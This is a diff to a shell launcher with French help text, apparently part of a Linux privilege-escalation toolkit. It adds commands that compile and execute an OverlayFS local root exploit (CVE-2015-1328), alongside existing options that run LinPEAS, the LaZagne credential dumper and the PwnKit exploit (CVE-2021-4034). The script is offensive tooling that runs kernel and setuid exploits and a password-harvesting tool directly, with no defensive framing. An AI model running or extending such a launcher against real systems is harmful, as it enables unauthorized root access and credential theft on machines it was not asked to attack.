@@ -25,9 +25,14 @@ if [[ "$*" == "-help" ]]; then
     echo "Commands:"
     echo "   -LinPeas       Execute LinPeas"
     echo "   -LaZagne       Execute LaZagne"
+    echo " " 
+    echo "OverlaysFS:"
+    echo "   -OverC         Compile le script C#"
+    echo "   -Overlays      Overlays64 - CVE-2015-1328"
+    echo " " 
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
     echo "   -check         Verifie si gcc est installer"
-    echo "   -perm          Applique les droit d'execution"
+    echo "   -perm          Applique les droit d'execution sur '/fullEx'"
     echo " "
     exit 0
 fi
@@ -59,3 +64,14 @@ for arch in 64 32; do
           "${PWD}/exploits/PwnKit/PwnKit${arch}"
      fi
 done
+
+# Compilation OverlayFS
+if [[ "$*" == "-OverC" ]]; then
+     gcc ${PWD}/exploits/Overlays/overlays.c -o ${PWD}/exploits/Overlays/overlays
+     echo "[+] Compilation successfuly !"
+fi
+
+# Execution OverlayFS
+if [[ "$*" == "-Overlays" ]]; then
+     "${PWD}/exploits/Overlays/overlays"
+fi
